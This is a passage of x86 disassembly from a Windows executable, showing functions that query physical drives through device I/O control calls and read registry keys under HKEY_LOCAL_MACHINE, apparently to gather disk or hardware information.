  4045d9:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4045e0:	8b 7d c0             	mov    -0x40(%ebp),%edi
  4045e3:	8b 75 c4             	mov    -0x3c(%ebp),%esi
  4045e6:	85 c0                	test   %eax,%eax
  4045e8:	75 4e                	jne    0x404638
  4045ea:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4045ed:	50                   	push   %eax
  4045ee:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4045f1:	51                   	push   %ecx
  4045f2:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4045f5:	52                   	push   %edx
  4045f6:	68 70 ac 41 00       	push   $0x41ac70
  4045fb:	b9 00 20 00 00       	mov    $0x2000,%ecx
  404600:	8b de                	mov    %esi,%ebx
  404602:	e8 d9 df ff ff       	call   0x4025e0
  404607:	83 c4 10             	add    $0x10,%esp
  40460a:	85 c0                	test   %eax,%eax
  40460c:	74 27                	je     0x404635
  40460e:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  404615:	85 f6                	test   %esi,%esi
  404617:	74 18                	je     0x404631
  404619:	8d 7d d0             	lea    -0x30(%ebp),%edi
  40461c:	b9 00 20 00 00       	mov    $0x2000,%ecx
  404621:	8b d6                	mov    %esi,%edx
  404623:	e8 18 df ff ff       	call   0x402540
  404628:	85 c0                	test   %eax,%eax
  40462a:	7c 05                	jl     0x404631
  40462c:	8b 7d d0             	mov    -0x30(%ebp),%edi
  40462f:	eb 07                	jmp    0x404638
  404631:	33 ff                	xor    %edi,%edi
  404633:	eb 03                	jmp    0x404638
  404635:	83 cf ff             	or     $0xffffffff,%edi
  404638:	8b c7                	mov    %edi,%eax
  40463a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40463d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404644:	59                   	pop    %ecx
  404645:	5f                   	pop    %edi
  404646:	5e                   	pop    %esi
  404647:	5b                   	pop    %ebx
  404648:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40464b:	33 cd                	xor    %ebp,%ecx
  40464d:	e8 fd 48 00 00       	call   0x408f4f
  404652:	8b e5                	mov    %ebp,%esp
  404654:	5d                   	pop    %ebp
  404655:	c3                   	ret
  404656:	cc                   	int3
  404657:	cc                   	int3
  404658:	cc                   	int3
  404659:	cc                   	int3
  40465a:	cc                   	int3
  40465b:	cc                   	int3
  40465c:	cc                   	int3
  40465d:	cc                   	int3
  40465e:	cc                   	int3
  40465f:	cc                   	int3
  404660:	83 ec 1c             	sub    $0x1c,%esp
  404663:	a1 08 d6 41 00       	mov    0x41d608,%eax
  404668:	33 c4                	xor    %esp,%eax
  40466a:	89 44 24 18          	mov    %eax,0x18(%esp)
  40466e:	8b 44 24 20          	mov    0x20(%esp),%eax
  404672:	55                   	push   %ebp
  404673:	33 ed                	xor    %ebp,%ebp
  404675:	89 44 24 0c          	mov    %eax,0xc(%esp)
  404679:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  40467d:	89 6c 24 08          	mov    %ebp,0x8(%esp)
  404681:	3b c5                	cmp    %ebp,%eax
  404683:	0f 84 17 01 00 00    	je     0x4047a0
  404689:	39 6c 24 28          	cmp    %ebp,0x28(%esp)
  40468d:	0f 84 0d 01 00 00    	je     0x4047a0
  404693:	53                   	push   %ebx
  404694:	68 00 28 00 00       	push   $0x2800
  404699:	e8 53 65 00 00       	call   0x40abf1
  40469e:	8b d8                	mov    %eax,%ebx
  4046a0:	83 c4 04             	add    $0x4,%esp
  4046a3:	3b dd                	cmp    %ebp,%ebx
  4046a5:	75 1c                	jne    0x4046c3
  4046a7:	6a 08                	push   $0x8
  4046a9:	ff 15 a8 80 41 00    	call   *0x4180a8
  4046af:	5b                   	pop    %ebx
  4046b0:	83 c8 ff             	or     $0xffffffff,%eax
  4046b3:	5d                   	pop    %ebp
  4046b4:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4046b8:	33 cc                	xor    %esp,%ecx
  4046ba:	e8 90 48 00 00       	call   0x408f4f
  4046bf:	83 c4 1c             	add    $0x1c,%esp
  4046c2:	c3                   	ret
  4046c3:	56                   	push   %esi
  4046c4:	57                   	push   %edi
  4046c5:	33 ff                	xor    %edi,%edi
  4046c7:	eb 07                	jmp    0x4046d0
  4046c9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4046d0:	57                   	push   %edi
  4046d1:	68 7c ac 41 00       	push   $0x41ac7c
  4046d6:	b9 00 28 00 00       	mov    $0x2800,%ecx
  4046db:	e8 00 df ff ff       	call   0x4025e0
  4046e0:	83 c4 08             	add    $0x8,%esp
  4046e3:	55                   	push   %ebp
  4046e4:	68 80 00 00 00       	push   $0x80
  4046e9:	6a 03                	push   $0x3
  4046eb:	55                   	push   %ebp
  4046ec:	6a 03                	push   $0x3
  4046ee:	55                   	push   %ebp
  4046ef:	53                   	push   %ebx
  4046f0:	ff 15 78 80 41 00    	call   *0x418078
  4046f6:	8b f0                	mov    %eax,%esi
  4046f8:	83 fe ff             	cmp    $0xffffffff,%esi
  4046fb:	74 79                	je     0x404776
  4046fd:	33 c0                	xor    %eax,%eax
  4046ff:	68 00 28 00 00       	push   $0x2800
  404704:	55                   	push   %ebp
  404705:	89 44 24 24          	mov    %eax,0x24(%esp)
  404709:	89 44 24 28          	mov    %eax,0x28(%esp)
  40470d:	53                   	push   %ebx
  40470e:	89 44 24 30          	mov    %eax,0x30(%esp)
  404712:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  404716:	89 6c 24 2c          	mov    %ebp,0x2c(%esp)
  40471a:	e8 71 48 00 00       	call   0x408f90
  40471f:	83 c4 0c             	add    $0xc,%esp
  404722:	55                   	push   %ebp
  404723:	8d 44 24 18          	lea    0x18(%esp),%eax
  404727:	50                   	push   %eax
  404728:	68 00 28 00 00       	push   $0x2800
  40472d:	53                   	push   %ebx
  40472e:	6a 0c                	push   $0xc
  404730:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  404734:	51                   	push   %ecx
  404735:	68 00 14 2d 00       	push   $0x2d1400
  40473a:	56                   	push   %esi
  40473b:	ff 15 70 80 41 00    	call   *0x418070
  404741:	85 c0                	test   %eax,%eax
  404743:	74 24                	je     0x404769
  404745:	8b 43 18             	mov    0x18(%ebx),%eax
  404748:	3b c5                	cmp    %ebp,%eax
  40474a:	76 1d                	jbe    0x404769
  40474c:	8b 54 24 18          	mov    0x18(%esp),%edx
  404750:	03 c3                	add    %ebx,%eax
  404752:	50                   	push   %eax
  404753:	8b 44 24 38          	mov    0x38(%esp),%eax
  404757:	52                   	push   %edx
  404758:	68 90 ac 41 00       	push   $0x41ac90
  40475d:	e8 9e fc ff ff       	call   0x404400
  404762:	83 c4 0c             	add    $0xc,%esp
  404765:	89 44 24 10          	mov    %eax,0x10(%esp)
  404769:	56                   	push   %esi
  40476a:	ff 15 90 81 41 00    	call   *0x418190
  404770:	39 6c 24 10          	cmp    %ebp,0x10(%esp)
  404774:	75 0a                	jne    0x404780
  404776:	47                   	inc    %edi
  404777:	83 ff 10             	cmp    $0x10,%edi
  40477a:	0f 8c 50 ff ff ff    	jl     0x4046d0
  404780:	53                   	push   %ebx
  404781:	e8 8e 63 00 00       	call   0x40ab14
  404786:	8b 44 24 14          	mov    0x14(%esp),%eax
  40478a:	83 c4 04             	add    $0x4,%esp
  40478d:	5f                   	pop    %edi
  40478e:	5e                   	pop    %esi
  40478f:	5b                   	pop    %ebx
  404790:	5d                   	pop    %ebp
  404791:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  404795:	33 cc                	xor    %esp,%ecx
  404797:	e8 b3 47 00 00       	call   0x408f4f
  40479c:	83 c4 1c             	add    $0x1c,%esp
  40479f:	c3                   	ret
  4047a0:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4047a4:	5d                   	pop    %ebp
  4047a5:	33 cc                	xor    %esp,%ecx
  4047a7:	83 c8 ff             	or     $0xffffffff,%eax
  4047aa:	e8 a0 47 00 00       	call   0x408f4f
  4047af:	83 c4 1c             	add    $0x1c,%esp
  4047b2:	c3                   	ret
  4047b3:	cc                   	int3
  4047b4:	cc                   	int3
  4047b5:	cc                   	int3
  4047b6:	cc                   	int3
  4047b7:	cc                   	int3
  4047b8:	cc                   	int3
  4047b9:	cc                   	int3
  4047ba:	cc                   	int3
  4047bb:	cc                   	int3
  4047bc:	cc                   	int3
  4047bd:	cc                   	int3
  4047be:	cc                   	int3
  4047bf:	cc                   	int3
  4047c0:	83 ec 10             	sub    $0x10,%esp
  4047c3:	56                   	push   %esi
  4047c4:	57                   	push   %edi
  4047c5:	33 ff                	xor    %edi,%edi
  4047c7:	57                   	push   %edi
  4047c8:	68 80 00 00 00       	push   $0x80
  4047cd:	6a 03                	push   $0x3
  4047cf:	57                   	push   %edi
  4047d0:	6a 01                	push   $0x1
  4047d2:	68 00 00 00 80       	push   $0x80000000
  4047d7:	50                   	push   %eax
  4047d8:	89 7c 24 2c          	mov    %edi,0x2c(%esp)
  4047dc:	89 7c 24 30          	mov    %edi,0x30(%esp)
  4047e0:	c7 44 24 24 01 01 01 	movl   $0x1010101,0x24(%esp)
  4047e7:	01 
  4047e8:	ff 15 78 80 41 00    	call   *0x418078
  4047ee:	8b f0                	mov    %eax,%esi
  4047f0:	83 fe ff             	cmp    $0xffffffff,%esi
  4047f3:	75 0a                	jne    0x4047ff
  4047f5:	33 c0                	xor    %eax,%eax
  4047f7:	33 d2                	xor    %edx,%edx
  4047f9:	5f                   	pop    %edi
  4047fa:	5e                   	pop    %esi
  4047fb:	83 c4 10             	add    $0x10,%esp
  4047fe:	c3                   	ret
  4047ff:	57                   	push   %edi
  404800:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  404804:	51                   	push   %ecx
  404805:	6a 08                	push   $0x8
  404807:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  40480b:	52                   	push   %edx
  40480c:	6a 04                	push   $0x4
  40480e:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  404812:	50                   	push   %eax
  404813:	68 02 00 17 00       	push   $0x170002
  404818:	56                   	push   %esi
  404819:	ff 15 70 80 41 00    	call   *0x418070
  40481f:	85 c0                	test   %eax,%eax
  404821:	75 08                	jne    0x40482b
  404823:	89 7c 24 10          	mov    %edi,0x10(%esp)
  404827:	89 7c 24 14          	mov    %edi,0x14(%esp)
  40482b:	56                   	push   %esi
  40482c:	ff 15 90 81 41 00    	call   *0x418190
  404832:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  404836:	8b 54 24 10          	mov    0x10(%esp),%edx
  40483a:	51                   	push   %ecx
  40483b:	52                   	push   %edx
  40483c:	e8 7f fb ff ff       	call   0x4043c0
  404841:	83 c4 08             	add    $0x8,%esp
  404844:	5f                   	pop    %edi
  404845:	5e                   	pop    %esi
  404846:	83 c4 10             	add    $0x10,%esp
  404849:	c3                   	ret
  40484a:	cc                   	int3
  40484b:	cc                   	int3
  40484c:	cc                   	int3
  40484d:	cc                   	int3
  40484e:	cc                   	int3
  40484f:	cc                   	int3
  404850:	83 ec 1c             	sub    $0x1c,%esp
  404853:	53                   	push   %ebx
  404854:	55                   	push   %ebp
  404855:	56                   	push   %esi
  404856:	33 f6                	xor    %esi,%esi
  404858:	57                   	push   %edi
  404859:	33 ff                	xor    %edi,%edi
  40485b:	89 74 24 18          	mov    %esi,0x18(%esp)
  40485f:	89 74 24 24          	mov    %esi,0x24(%esp)
  404863:	39 74 24 30          	cmp    %esi,0x30(%esp)
  404867:	74 21                	je     0x40488a
  404869:	39 74 24 34          	cmp    %esi,0x34(%esp)
  40486d:	74 1b                	je     0x40488a
  40486f:	68 00 02 00 00       	push   $0x200
  404874:	e8 78 63 00 00       	call   0x40abf1
  404879:	8b d8                	mov    %eax,%ebx
  40487b:	83 c4 04             	add    $0x4,%esp
  40487e:	3b de                	cmp    %esi,%ebx
  404880:	75 13                	jne    0x404895
  404882:	6a 08                	push   $0x8
  404884:	ff 15 a8 80 41 00    	call   *0x4180a8
  40488a:	83 c8 ff             	or     $0xffffffff,%eax
  40488d:	5f                   	pop    %edi
  40488e:	5e                   	pop    %esi
  40488f:	5d                   	pop    %ebp
  404890:	5b                   	pop    %ebx
  404891:	83 c4 1c             	add    $0x1c,%esp
  404894:	c3                   	ret
  404895:	8d 44 24 14          	lea    0x14(%esp),%eax
  404899:	50                   	push   %eax
  40489a:	68 19 01 02 00       	push   $0x20119
  40489f:	56                   	push   %esi
  4048a0:	68 98 ac 41 00       	push   $0x41ac98
  4048a5:	68 02 00 00 80       	push   $0x80000002
  4048aa:	ff 15 08 80 41 00    	call   *0x418008
  4048b0:	85 c0                	test   %eax,%eax
  4048b2:	0f 85 3c 01 00 00    	jne    0x4049f4
  4048b8:	8b 54 24 14          	mov    0x14(%esp),%edx
  4048bc:	8b 2d 0c 80 41 00    	mov    0x41800c,%ebp
  4048c2:	56                   	push   %esi
  4048c3:	56                   	push   %esi
  4048c4:	56                   	push   %esi
  4048c5:	56                   	push   %esi
  4048c6:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  4048ca:	51                   	push   %ecx
  4048cb:	53                   	push   %ebx
  4048cc:	56                   	push   %esi
  4048cd:	52                   	push   %edx
  4048ce:	c7 44 24 30 00 01 00 	movl   $0x100,0x30(%esp)
  4048d5:	00 
  4048d6:	ff d5                	call   *%ebp
  4048d8:	85 c0                	test   %eax,%eax
  4048da:	0f 85 aa 00 00 00    	jne    0x40498a
  4048e0:	8b 44 24 14          	mov    0x14(%esp),%eax
  4048e4:	85 c0                	test   %eax,%eax
  4048e6:	75 05                	jne    0x4048ed
  4048e8:	b8 02 00 00 80       	mov    $0x80000002,%eax
  4048ed:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  4048f1:	51                   	push   %ecx
  4048f2:	68 19 01 02 00       	push   $0x20119
  4048f7:	6a 00                	push   $0x0
  4048f9:	53                   	push   %ebx
  4048fa:	50                   	push   %eax
  4048fb:	ff 15 08 80 41 00    	call   *0x418008
  404901:	85 c0                	test   %eax,%eax
  404903:	75 5e                	jne    0x404963
